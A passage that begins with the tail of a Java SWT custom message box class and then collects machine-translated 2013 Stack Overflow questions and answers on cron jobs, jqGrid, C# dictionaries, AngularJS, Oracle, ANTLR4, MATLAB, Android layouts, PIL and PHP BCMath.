        y = SCREEN_MINIMUM;

    return new Point( x, y );
}

/**
 * Creates the contents and places them in the shell
 */
private void createContents( Display display )
{
    FormData formData;
    GridData gridData;
    Button button;
    Button lastButton;

    ivShell.setLayout( new GridLayout( 2, false ) );
    ivShell.setText( ivTitle );

    {
        ivCompositeImage = new Composite( ivShell, SWT.NONE );
        ivCompositeImage.setLayout( new FormLayout() );

        gridData = new GridData();
        gridData.grabExcessHorizontalSpace = true;
        gridData.grabExcessVerticalSpace = true;
        gridData.verticalAlignment = SWT.TOP;
        gridData.horizontalAlignment = SWT.LEFT;
        ivCompositeImage.setLayoutData( gridData );
    }
    {
        ivCompositeMessage = new Composite( ivShell, SWT.NONE );
        ivCompositeMessage.setLayout( new FormLayout() );

        gridData = new GridData();
        gridData.grabExcessHorizontalSpace = true;
        gridData.grabExcessVerticalSpace = true;
        ivCompositeMessage.setLayoutData( gridData );
    }
    {
        ivCompositeDummy = new Composite( ivShell, SWT.NONE );
        ivCompositeDummy.setLayout( new FormLayout() );
    }
    {
        ivCompositeButtons = new Composite( ivShell, SWT.NONE );
        ivCompositeButtons.setLayout( new FormLayout() );

        gridData = new GridData();
        gridData.grabExcessHorizontalSpace = true;
        gridData.grabExcessVerticalSpace = true;
        gridData.horizontalAlignment = SWT.END;
        ivCompositeButtons.setLayoutData( gridData );
    }

    {
        ivLabelImage = new Label( ivCompositeImage, SWT.NONE );

        formData = new FormData();
        formData.top = new FormAttachment( 0, 0 );
        formData.left = new FormAttachment( 0, 0 );
        ivLabelImage.setLayoutData( formData );

        ivLabelImage.setImage( display.getSystemImage( ivImageCode.getImageCode() ) );
    }
    {
        ivLabelMessage = new Label( ivCompositeMessage, SWT.WRAP );

        formData = new FormData();
        formData.top = new FormAttachment( 0, 0 );
        formData.left = new FormAttachment( 0, 0 );
        formData.right = new FormAttachment( 100, 0 );
        formData.bottom = new FormAttachment( 100, 0 );
        ivLabelMessage.setLayoutData( formData );

        // we add a new line to place white-space between the message and the buttons
        // the trailing space is required!
        ivLabelMessage.setText( ivMessage + System.getProperty( "line.separator" ) + " " ); //$NON-NLS-1$ //$NON-NLS-2$

        if (ivMessageForegroundColor != null)
            ivLabelMessage.setForeground( ivMessageForegroundColor );

        if (ivMessageBackgroundColor != null)
            ivLabelMessage.setBackground( ivMessageBackgroundColor );

        if (ivMessageFont != null)
            ivLabelMessage.setFont( ivMessageFont );
    }

    lastButton = null;

    for (ButtonParameter parm : ivButtons)
    {
        button = new Button( ivCompositeButtons, SWT.PUSH );
        formData = new FormData();

        if (lastButton == null)
            formData.right = new FormAttachment( 100, -FORM_SPACING );
        else
            formData.right = new FormAttachment( lastButton, -FORM_SPACING, SWT.LEFT );

        formData.bottom = new FormAttachment( 100, -FORM_SPACING );

        button.setLayoutData( formData );
        button.setText( parm.getCaption() );

        button.addMouseListener( new ButtonMouseListener( parm.getResult() ) );

        lastButton = button;

        if (parm.isDefault())
            ivShell.setDefaultButton( button );
    }

    if (ivShell.getDefaultButton() == null)
        ivShell.setDefaultButton( lastButton );
}

/**
 * Internal class which holds the button parameters. This is created by the {@link  CustomMessageBox#addButton(String, int, boolean)} method
 */
private class ButtonParameter
{
    private String  ivCaption;
    private int     ivResult;
    private boolean ivIsDefault;

    /**
    * Create a button parameter
    * @param caption - the caption for the button
    * @param result - the returned result when the button is chosen
    * @param isDefault - this will be the default button.
    */
    private ButtonParameter( String caption, int result, boolean isDefault )
    {
        super();

        ivCaption = caption;
        ivResult = result;
        ivIsDefault = isDefault;
    }

    private String getCaption()
    {
        return ivCaption;
    }

    private int getResult()
    {
        return ivResult;
    }

    private boolean isDefault()
    {
        return ivIsDefault;
    }
}

/**
 * Mouse listener for the buttons.
 */
private class ButtonMouseListener extends MouseAdapter
{
    private int ivButtonResult;

    /**
     * Creates the listener
     * @param result - The result returned when the button is pressed
     */
    private ButtonMouseListener( int result )
    {
        super();

        ivButtonResult = result;
    }

    @Override
    public void mouseUp( MouseEvent e )
    {
        ivResult = ivButtonResult;

        ivShell.close();
    }
} 
```

}**

# shell - 尽管独立工作正常，但 Crontab 没有运行带有 echo 命令的 shell 脚本

> ID：14832390
> 
> 赞同：-1
> 
> 时间：2013-02-12T12:17:37.607
> 
> 标签：shell, echo, crontab

抱歉这么久，下面是我机器上相关的“env”变量

```
HOSTNAME=localhost.localdomain
SHELL=/bin/bash
TERM=xterm-256color
HISTSIZE=1000
SUDO_USER=subhasish
SUDO_UID=500
USERNAME=root
PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin
MAIL=/var/spool/mail/subhasish
PWD=/backup
LANG=en_US.UTF-8
SHLVL=1
SUDO_COMMAND=/bin/su
HOME=/root
LOGNAME=root
LESSOPEN=|/usr/bin/lesspipe.sh %s
SUDO_GID=500
G_BROKEN_FILENAMES=1
_=/bin/env 
```

## 我的 shell 脚本只是登录到路由器并获取信息，

```
#!/bin/sh 
PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin
export DISPLAY=:0.0

host=**********
port=23
login=*********
passwd=*******
passwd2=*******
cmd="term len 0"
cmd2="sh clock"
cmd3="sh ip accounting"

(echo open ${host} ${port}
sleep 1
echo ${login}
sleep 1
echo ${passwd}
sleep 1
echo en
sleep 1
echo ${passwd2}
sleep 1
echo ${cmd} 
sleep 1
echo ${cmd2}
sleep 1 
echo ${cmd3}
sleep 5
echo exit) | telnet >> file.txt

sed '/telnet/,/term len 0/d' file.txt >> file2.txt
mv file2.txt file.txt 
```

* * *

这可以很好地独立使用，但是使用 crontab，它拒绝工作。

```
crontab -l
SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin
*/2 * * * * /bin/sh /backup/telnet.sh 
```

如果你这样做了，tail -f /var/log/cron，它显示 cron 正在运行，但没有产生 file.txt。手动运行时我得到 file.txt 。

```
Feb 11 23:26:01 localhost CROND[29053]: (root) CMD (/bin/sh /backup/telnet.sh)
Feb 11 23:28:01 localhost CROND[29074]: (root) CMD (/bin/sh /backup/telnet.sh) 
```

为了测试 crontab 是否真正工作，我从 crontab 运行了 2 行以下，它工作正常。

```
#* * * * * touch /backup/testing.txt
#* * * * *  /backup/test.sh

where test.sh is,
cat test.sh
#!/bin/sh
touch /backup/testing.txt 
```

我认为来自 crontab 的回显可能是不可能的，即 `* * * * * /bin/echo "Hello, world!"`不起作用，但是`* * * * * /bin/echo "Hello, world!" >> /backup/test.out`会给出输出 test.out。但是这里的 echo 在脚本里面，应该不是问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:53:07.343

Take in account that lines like these:

```
sed '/telnet/,/term len 0/d' file.txt >> file2.txt
mv file2.txt file.txt 
```

Are not very good for a cronjob: you need to put absolute paths, because otherwise everything will be saved in /.

What I suggest is to change it for this:

```
sed '/telnet/,/term len 0/d' /dir/to/your/file/file.txt >> /dir/to/your/file/file2.txt
mv /dir/to/your/file/file2.txt /dir/to/your/file/file.txt 
```

# jqgrid - jqGrid 绑定键

> ID：14832394
> 
> 赞同：1
> 
> 时间：2013-02-12T12:18:00.037
> 
> 标签：jqgrid

我使用 jqGrid 并希望网格可以按键滚动。UP/DOWN 功能应该和[这里](http://www.ok-soft-gmbh.com/jqGrid/SimpleLocalGridWithInlineEditingOnEnter.htm)一样，但是当用户按下 ENTER 或单击一行时，用户会被重定向到不同的页面。

到目前为止我所拥有的是

*   将用户重定向到 onSelectRow 中不同页面的代码
*   .jqGrid('bindKeys')

现在有两个问题：

*   当按下 UP/DOWN 时，用户转到不同的行，然后执行 onSelectRow 中的代码。我该如何防止呢？
*   当按下 UP/DOWN 时，整个屏幕滚动一点点。如何防止屏幕滚动发生？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T16:07:40.227

通过检查此方法为 keyCode 38 和 40 接收的事件参数，我能够解决在 UP/DOWN 时触发 onSelectRow 的第一个问题。这允许我滚动网格而不在 onSelectRow 中执行我的代码。整个屏幕移动的第二个问题不知何故“自行”消失了。

# c# - 将列表值添加到字典

> ID：14832403
> 
> 赞同：0
> 
> 时间：2013-02-12T12:18:29.940
> 
> 标签：c#, idictionary, oledbdatareader

我正在尝试填充一个字典，其中唯一的主题值具有应该与之匹配的各种代码值。

```
CODE    SUBJECT

7DIM-062  Recruitment and Selection

7DIM-063    Recruitment and Selection

7DIM-064    Recruitment and Selection

7DIM-065    Recruitment and Selection

7DIM-066    Recruitment and Selection

7DIM-067    Recruitment and Selection

7DIM-068    Recruitment and Selection 
```

所以我想要的只是将 Reqruitment 和 Selection 作为唯一键添加到 Dictionary 中，然后将所有相应的代码添加到 List 中。我该怎么做呢？

```
Dictionary<string, List<string>> dict = new Dictionary<string,List<string>>(); 
```

这是我的查询

```
OleDbDataReader dbReader = cmd.ExecuteReader();
while (dbReader.Read())
{
    string code = (string)dbReader["CODE"];
    string subject = (string)dbReader["SUBJECT"];
    //???? this is the point where I would want to add the values
    dict.Add(subject, new List<string>().Add(code); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-12T12:22:19.413

首先检查您的字典是否已经有密钥，如果没有，则在`List`初始化时添加新密钥。

```
if (!dict.ContainsKey(subject))
{
    dict[subject] = new List<string>();    
}

dict[subject].Add(code); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-12T12:25:13.013

您可以使用[`Dictionary.TryGetValue`](http://msdn.microsoft.com/en-us/library/bb347013.aspx)来查看您的字典是否已包含该主题。然后你可以添加新的代码，否则添加主题+代码：

```
Dictionary<string, List<string>> dict = new Dictionary<string,List<string>>();
while (dbReader.Read())
{
    string code = (string)dbReader["CODE"];
    string subject = (string)dbReader["SUBJECT"];

    List<string> codes;
    if (dict.TryGetValue(subject, out codes))
    {
        codes.Add(code);
    }
    else
    {
        codes = new List<string>() { code };
        dict.Add(subject, codes);
    }
} 
```

它比查找两次更有效。

> 此方法结合了 ContainsKey 方法和 Item 属性的功能。如果未找到键，则 value 参数获取类型 TValue 的适当默认值；例如，整数类型为 0（零），布尔类型为 false，引用类型为 null。如果您的代码经常尝试访问不在字典中的键，请使用 TryGetValue 方法。使用此方法比捕获 Item 属性抛出的 KeyNotFoundException 更有效。此方法接近 O(1) 操作。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-12T12:32:27.800

您可以使用[查找`<string, string>`](http://msdn.microsoft.com/en-us/library/bb460184%28v=vs.100%29.aspx)：

```
var subjects = new List<KeyValuePair<string, string>>();
while (dbReader.Read())
{
    string code = (string)dbReader["CODE"];
    string subject = (string)dbReader["SUBJECT"];

    subjects.Add(new KeyValuePair<string, string>(subject, code));
}
// ...
var lookup = subjects.ToLookup(x => x.Key, x => x.Value);
var recruitmentAndSelectionCodes = lookup["Recruitment and Selection"].ToList();
// returns
//     7DIM-062 
//     7DIM-063 
//     etc. 
```

# javascript - AngularJS ng-model 将对象转换为字符串

> ID：14832405
> 
> 赞同：7
> 
> 时间：2013-02-12T12:18:38.833
> 
> 标签：javascript, angularjs

我的 HTML 文件中有以下内容：

```
 <td style="width: 200px;">
        <span ng-repeat="list in listGroups">
            <label for="{{ list.description }}" />{{ list.description }}</label>
            <input ng-model="$parent.listGroup" id="listGroup-{{ list.value }}"  name="listGroups" value="{{ list }}" type="radio" />
        </span>
   </td> 
```

listGroups 包含：

```
[
    {
        "description": "New by Territory",
        "group": "product",
        "type": "new"
    },
    {
        "description": "New by Genre",
        "group": "genre",
        "type": "new"
    },
    {
        "description": "Charts by Territory",
        "group": "product",
        "type": "chart"
    },
    {
        "description": "Charts by Genre",
        "group": "genre",
        "type": "chart"
    }
] 
```

当我单击单选按钮时，listGroup（在 ng-model 中设置）变为，例如：

```
{"description":"New by Genre","group":"genre","type":"new"} 
```

当我用 来查看 listgroup 时`typeof $scope.listGroup`，我发现它现在是一个字符串！

因此，我无法在 HTML 页面的其余部分的其他绑定中访问它的属性。

在这种情况下，我想要`ng-show="listGroup.group == 'genre'"`

这里发生了什么，更重要的是，我如何让它做我想做的事情，即将对象保持为对象？

谢谢大家

戴夫

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T14:01:17.193

问题是输入的`value`属性只接受*字符串*，而不接受*对象*（检查[here](http://docs.angularjs.org/api/ng.directive%3ainput.radio)）。当你这样做时：`value="{{ list }}"`，你基本上是在做`input.value = list.toString()`。

一种可能的解决方法是使用指令`$index`的。`ng-repeat`示例：http: [//jsfiddle.net/bmleite/cKttd/](http://jsfiddle.net/bmleite/cKttd/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-04-05T13:04:21.467

现在可以使用`ng-value`.

例子

`<input ng-model="$parent.listGroup" id="listGroup-{{ list.value }}" name="listGroups" ng-value="{{ list }}" type="radio" />`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T13:53:24.430

为什么要将对象作为 ng-model？这就是导致您的 listGroup 变量变为字符串的原因，因为 ng-model 仅适用于字符串。如果你有一个复杂的对象要与 ng-model 一起使用，你应该创建一个指令并实现一个解析器和一个格式化程序，如下所示：[如何在 angular.js 中进行双向过滤？](https://stackoverflow.com/questions/11616636/how-to-do-two-way-filtering-in-angular-js)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-05-20T16:27:04.970

您也可以 JSON.parse(object-in-string) ，但我认为我更喜欢 @bmleite 解决方案。只是把它扔在那里——以防有人有不同的用例。

# c#-4.0 - Oracle.DataAccess.Client.OracleException

> ID：14832407
> 
> 赞同：0
> 
> 时间：2013-02-12T12:18:51.407
> 
> 标签：c#-4.0, oracle11g

我有一个涉及 oracle 数据库的 Web 服务。

我使用 ODP.net oracle 数据提供程序。我相信实际的程序集称为 Oracle.DataAccess.dll。
好吧，虽然在我的本地机器上一切正常，但当我升级到服务器时，我总是得到这个异常......

```
Oracle.DataAccess.Client.OracleException: The provider is not compatible with the version of Oracle client 
```

我尝试了多种方法，包括尝试强制我的服务使用当前的 DLL ...

```
<configSections>
   <section name="oracle.dataaccess.client" type="System.Data.Common.DbProviderConfigurationHandler, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
</configSections>

  <oracle.dataaccess.client>
    <settings>
      <add name="DllPath" value="C:\WebSites\xxxx.yyy.zzz\OracleDllBinNewbin\Oracle.DataAccess.dll" />
    </settings>
  </oracle.dataaccess.client> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-08T15:24:03.160

在本地运行时，您可能在 32 位/x86 进程中运行（Visual Studio 本身是 x86 主机）。当你在服务器上运行时，它变成了一个 x64 进程。

据我了解，Oracle 数据客户端 dll 是 x86 或 x64，这与 MS dll 不同，后者拥有“任何 CPU”，允许 Dll 在两者之间无缝切换。

强制本地计算机上的托管应用程序在 X64（项目属性，构建）中执行，看看会发生什么。

我仍在试图弄清楚如何在本地工作站和服务之间的引用之间切换，你的小 xml 片段只是给了我一个线索！

# antlr4 - 具有替代方案的规则集 - 如何避免 reportAttemptingFullContext 和 reportContextSensitivity

> ID：14832409
> 
> 赞同：3
> 
> 时间：2013-02-12T12:18:52.243
> 
> 标签：antlr4

我在理解 'reportAttemptingFullContext' 和 'reportContextSensitivity' 时遇到了一些麻烦，并且在我的语法中无法避免这些问题。这里有一个例子：

```
IF L_COUNT > 0 THEN
    LINEFEED;
END IF; 
```

这里摘录我的语法：

```
if_statement
:   
IF plsql_condition THEN 
seq_of_statements? elsif_statement* else_statement? END IF
;

plsql_condition
    :   expr_bool
    ;

expr_bool
:
expr_or (OR expr_or)*
;

expr_or
:
expr_and (AND expr_and)*
;

expr_and
:
NOT? expr_not
;

expr_not
:
expr_not_is |
expr_not_between |
expr_not_in |
expr_not_op |
expr_add
; 
```

和错误信息：

```
line 1:13 TIME: 2013-02-12 09:15:52.225, reportAttemptingFullContext d=116, rule='expr_not', input='L_COUNT > 0'
line 1:11 TIME: 2013-02-12 09:15:52.228,reportContextSensitivity d=116, rule='expr_not', input='L_COUNT >'
line 1:11 TIME: 2013-02-12 09:15:52.354, reportAttemptingFullContext d=120, rule='expr_not_op', input='>'
line 1:11 TIME: 2013-02-12 09:15:52.355,reportContextSensitivity d=120, rule='expr_not_op', input='>' 
```

整个语法相当大。这是一个简单的例子。每次我有替代品时，我基本上都会遇到一个问题（如上面的“expr_not”）。我该如何避免这些？我曾尝试使用语义谓词，但这只有在规则中标记的位置在代码生成时固定时才有可能（据我所知）。在以下代码中注释时（更复杂的示例）：

```
COLUMN FORMAT FORMAT.PRICE(OBJ_CURRY(TOP.STRIKE_CURRY_ID).RD(TOP.INTR_PAY * (TOP.NOTE_RATIO * L_ALLOC)),TOP.STRIKE_CURRY_ID); 
```

我将解析时间乘以 20；这是相当痛苦的。在这种情况下，我也会得到一个“reportAttemptingFullContext”。

我的问题：如何避免替代方案中的“reportAttemptingFullContext”。

谢谢您的帮助。亲切的问候，沃尔夫冈·哈默

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T15:32:16.440

完整上下文解析的唯一问题是潜在的性能影响（取决于需要它的频率以及解决 SLL 冲突需要多少前瞻）。如果您的语法在 SLL 模式下是明确的，那么 ANTLR 书中描述的两阶段解析策略（[这里有一个实现](https://github.com/antlr/antlr4/blob/master/tool/test/org/antlr/v4/test/TestPerformance.java)）将阻止对所有不包含语法错误的源文件进行全上下文解析。两阶段解析总是产生与启用全上下文解析相同的最终结果，但在满足以下属性的语法+输入方面获得了主要的性能优势。

1.  大多数被解析的源文件不包含语法错误。
2.  大多数不包含语法错误的源文件为`PredictionMode.SLL`and提供相同的解析树`PredictionMode.LL`（请参阅[`PredictionMode`](https://github.com/antlr/antlr4/blob/master/runtime/Java/src/org/antlr/v4/runtime/atn/PredictionMode.java)枚举）。

# matlab - 如何在matlab中将颜色设置为一个值？

> ID：14832413
> 
> 赞同：0
> 
> 时间：2013-02-12T12:19:12.540
> 
> 标签：matlab, map, colors, matrix

假设我有一个整数矩阵。我想将一个值映射到颜色。例如，值 0 将显示为黑色，值 0.5 将显示为绿色等。我尝试了颜色图，但它没有按我的意愿工作。在颜色图中，当我更改矩阵中的值时，它也会影响其他值。

那么如何将颜色映射到值？一个单元格包含 0，显示为黑色。一个单元格包含 0.5，显示为绿色。一个单元格包含等于或大于 1 的数字，显示为黄色。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:54:08.860

The easiest way I would think of doing anything like what you are saying is:

*   Define a `colormap` as:

    cm = colormap([0 0 0; 0 1 0; 1 1 0]);

*   Define a `caxis` as:

    caxis([0 1]);

*   Use something like `pcolor` to represent your data.

All these is assuming that you want to represent some kind of color map in 2D. If you intend to plot a simple curve, but changing the color of the data points, you should do it manually, plotting them individually and setting the color manually for each point, depending on the value of the data:

```
% plot y versus x variable
for ii = 1:length(x)
    if y(ii) < 0.5
        color = [0 0 0];
    elseif y(ii) < 1
        color = [0 1 0];
    else
        color = [1 1 0];
    end
    plot(x(ii), y(ii), '.', 'Color', color);
    hold on;
end
hold off; 
```

# python - 从列中读取名称并在另一个 Excel 文件中找到与该名称对应的值？

> ID：14832418
> 
> 赞同：-4
> 
> 时间：2013-02-12T12:19:30.023
> 
> 标签：python, windows, excel

我希望您帮助编写执行以下操作的脚本（最好是 python）。鉴于我在第一列中有两个具有一些匹配值（名称）的 excel 文件。第一个文件中的第二列具有值（数字），第二个文件中的第二列为空。我的任务是从第二个文件中读取一个名称，查看它是否与第一个文件中的任何名称匹配，然后从那里读取相应的值，然后将该值写回第二个文件中。等等……请帮忙！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T18:56:53.110

你为什么不使用基本的excel函数来做到这一点？该`vlookup`功能经过优化可以做到这一点！

您的第二个选项（仅适用于基本 vlookup 或更高级`index`和`match`功能无法处理的非常复杂的场景）应该是允许您**在**脚本 Excel 中使用 python 的[datanitro 。](https://datanitro.com/)

 **有一个类似的[Stackoverflow 问题](https://stackoverflow.com/questions/3504604/recommend-a-python-library-to-read-excel-xls-files)，一个[专门](http://www.python-excel.org/)用于从 python 中使用 excel 的网站（也有点旧），所以如果你出于某种原因选择这条路径，会有很多文档。应该**警告**您大多数 python excel 库只处理 xls 文件，而不处理较新的 xlsx/xlsm。

**[openpyxl](http://pythonhosted.org/openpyxl/#)**应该是支持 xlsx 的较新库，但我自己没有尝试过。

还有一些**Meta StackOverflow 建议：**由于您是新用户，因此这是一个社区驱动的问答网站。请通过提供更多数据来更轻松地回答您的问题：您尝试了什么？向我们展示代码。解释用例是什么，展示一些研究等。这将有助于向社区展示你所做的努力，我们会更愿意提供帮助。也接受正确或有帮助的答案，这会给我们积分和乐趣。**

# javascript - ie7不能用javascript循环字符串

> ID：14832419
> 
> 赞同：1
> 
> 时间：2013-02-12T12:19:38.083
> 
> 标签：javascript, string, loops, internet-explorer-7, ie7.js

任何人都知道为什么这在 IE7 中不起作用以及如何使它起作用？

```
var test = "hello";
for (var i = 0, len = test.length; i < len; i++) {
    alert(test[i]);
} 
```

或见[http://jsfiddle.net/75Cqt/](http://jsfiddle.net/75Cqt/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:21:22.273

IE7 不支持使用 索引到字符串`[i]`，你必须使用`charAt(i)`. 例如：

```
var test = "hello";
for (var i = 0, len = test.length; i < len; i++) {
    alert(test.charAt(i));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:21:23.417

尝试`test.charAt(i)`代替`char[i]`

# android - 如何保持滚动视图？

> ID：14832421
> 
> 赞同：-4
> 
> 时间：2013-02-12T12:19:42.563
> 
> 标签：android, scrollview

我想设置滚动视图。这个怎么做？

在我的 Listview 中，我有 10 个项目要查看..我只能看到 7 个项目..Remanining 3 个项目我需要一个滚动视图才能看到..有任何可能保持滚动视图..请指导我..

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
        xmlns:tools="http://schemas.android.com/tools"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        tools:context=".Nexttopic" >

     <ListView
        android:id="@+id/List_view"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_centerHorizontal="true"
        android:layout_centerVertical="true" >
     </ListView>
</RelativeLayout> 
```

> ```
>  LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
>       viewList = Nexttopic.this.getLayoutInflater().inflate(R.layout.activity_nexttopic, null);
>       dialogMarketList = new Dialog(Nexttopic.this);
>       dialogMarketList.requestWindowFeature(Window.FEATURE_NO_TITLE);
>       dialogMarketList.setContentView(viewList);
>       dialogMarketList.show();     
>       lvForDialog = (ListView) viewList.findViewById(R.id.List_view);
>       ArrayAdapter<String> adapter = (new ArrayAdapter<String>(Nexttopic.this, R.layout.row_topic, R.id.child_row,tnamelist));
>       lvForDialog.setAdapter(adapter); 
> ```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:23:22.113

滚动视图是什么原因？您有 listview 只需将高度设置为 match_parent ，它会自行处理滚动项目

使用此布局而不是使用滚动视图

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
        xmlns:tools="http://schemas.android.com/tools"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        tools:context=".Nexttopic" >

     <ListView
        android:id="@+id/List_view"
        android:layout_width="match_parent"
        android:layout_height="match_parent">
     </ListView>
</RelativeLayout> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:23:17.943

您应该尝试使用一种名为：[Google](http://www.google.com) 对我的最后一个答案感到抱歉。阅读此内容：Listview 因此具有内置滚动功能。将其封装在任何其他布局中，例如 LinearLayout 或 RelativeLayout。如果您仍然有问题，请显示一些您的代码。

```
EDIT: 
```

不知道，但试试这个

```
 listview.setTranscriptMode(ListView.TRANSCRIPT_MODE_ALWAYS_SCROLL); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:24:23.137

无需为列表视图放置滚动视图。它会根据列表视图中的行数自动滚动。

# android - 横向到纵向视图不起作用

> ID：14832424
> 
> 赞同：0
> 
> 时间：2013-02-12T12:19:51.320
> 
> 标签：android, android-orientation

我想改变我`view`的方向。为此，我在资源中创建了`layout-land`&`layout-port`文件夹。方向纵向到横向视图正在工作，但横向到纵向视图不起作用。为什么会这样？

我的 .manifest 文件代码：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="in.wptrafficanalyzer.landportdemo"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk android:minSdkVersion="10" />

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name" >
    <activity
        android:name=".MainActivity"
        android:label="@string/app_name" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
  </application>
  </manifest> 
```

端口/main.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:orientation="vertical" >

<TextView
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="this is my portrait view" 
    android:layout_gravity="center_horizontal"

    />

 </LinearLayout> 
```

土地/main.xml

```
 <?xml version="1.0" encoding="utf-8"?>
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
 android:layout_width="fill_parent"
 android:layout_height="fill_parent"
 android:orientation="vertical" >

 <TextView
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="this is my Landscape view" 
    android:layout_gravity="center_horizontal"

    />

   </LinearLayout> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T13:15:50.193

将文件夹名称 layout-port 重命名为 layout only 并在 manifest.xml 文件中在活动标签中添加一个属性

```
<activity
    android:name=".MainActivity"
    android:label="@string/app_name"
    android:configChanges="orientation|screenSize">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />

        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity> 
```

# python - PIL镜像坐标

> ID：14832425
> 
> 赞同：2
> 
> 时间：2013-02-12T12:19:57.570
> 
> 标签：python, image, python-imaging-library

我有一张使用 PIL 创建的图像

```
import Image
import ImageDraw

img = Image.new("RGB", (400,400), "white")
draw = ImageDraw.Draw(img)

coords = [(100,70), (220, 310), (200,200)]
dotSize = 2

for (x,y) in coords:
    draw.rectangle([x,y,x+dotSize-1,y+dotSize-1], fill="black") 
```

我知道要编辑此图像并获取每个坐标并在同一图像上制作它的对角镜像。

有没有我可以使用的方法？我想要这个效果！[https://imgur.com/Q6LLhmk](https://imgur.com/Q6LLhmk)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:55:08.263

您可以使用 PIL 的`transpose`,`rotate`和`composite`函数来实现所需的结果。这些都在[Image](http://effbot.org/imagingbook/image.htm)模块中。

我稍微更改了初始图像以使结果更清晰。对于初学者，我增加了每个点的大小以使它们更明显。

下面的代码首先显示了覆盖有掩码的初始图像，该掩码选择从左上角到右下角对角线下方的一半图像。

![在此处输入图像描述](../Images/a2bff941b184258663c90cb2eac43ff0.png)

然后它显示了原始图像和镜像图像的合成。

![在此处输入图像描述](../Images/4dc63eb8770ce8db58c677ae767e43b3.png)

```
import Image
import ImageDraw

imsize = 400
img = Image.new("L", (imsize,imsize), "white")
draw = ImageDraw.Draw(img)

coords = [(100,70), (220, 310), (200,200), (80,20)]
dotSize = 50

for (x,y) in coords:
    draw.rectangle([x,y,x+dotSize-1,y+dotSize-1], fill="black")

## mirror image along the diagonal
img2 = img.rotate(90).transpose(Image.FLIP_TOP_BOTTOM)

## mask
mask = Image.new("L", (imsize,imsize), "black")
maskdraw = ImageDraw.Draw(mask)
# draw a triangle on the mask dividing the image along the diagonal
maskdraw.polygon([(0,0),(0,imsize),(imsize,imsize)], fill="white")

# show the mask overlaid on the original image
Image.blend(mask, img, 0.5).show()

# compute and show the blended result
img3 = Image.composite(img, img2, mask)
img3.show() 
```

# php - 使用 BCMath 时是否有一致的方法来测试 0（零）？

> ID：14832440
> 
> 赞同：1
> 
> 时间：2013-02-12T12:21:13.597
> 
> 标签：php, bcmath

运行以下命令，我希望收到`N, Y, Y`.

我理解为什么我不这样做，因为`'0.00' != '0'`对于第二个示例，但是否有一致的测试方法，`0`无需强制转换为 float/double，也无需`===`将`==`.

```
echo bcmul( '5.1', '2.234', 2 );
echo bcmul( '5.1', '2.234', 2 ) === '0' ? '  Y  ' : '  N  ';
echo "<br/>";

echo bcmul( '0.00', '000.00', 2 );
echo bcmul( '0.00', '000.00', 2 ) === '0' ? '  Y  ' : '  N  ';
echo "<br/>";

echo bcmul( '0', '0', 2 );
echo bcmul( '0', '0', 2 ) === '0' ? '  Y  ' : '  N  ';
echo "<br/>"; 
```

* * *

**笔记**

> 为什么我不想放弃`===`？

如果我通过诸如 之类的方法将功能作为更大项目的一部分提供`get_total_cost()`，我认为其他开发人员在期望函数返回数值时不得不放弃严格比较是不直观的作为一个字符串。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:34:26.027

A. Yes`0.00 !== 0`是有效的，因为它们不是同一类型

```
var_dump(0.00,0); 
```

输出

```
float 0
int 0 
```

B. `0 !== "0"` is valid because they are not the same type

```
var_dump(0,"0"); 
```

Output

```
int 0
string '0' (length=1) 
```

C. Why don't I want to drop the `===`

```
var_dump("hello" == 0 );  true
var_dump("hello" === 0 );  false 
```

[Conclusion](http://www.php.net/manual/en/language.operators.comparison.php)

> $a === $b TRUE if $a is equal to $b, and they are of the same type.

I guess this is what you want

```
echo (int) bcmul('0.00', '000.00', 2) === (int) '0' ? '  Y  ' : '  N  '; 
       ^                                    ^ 
```

* * *

## 回答 #2

> 赞同：0
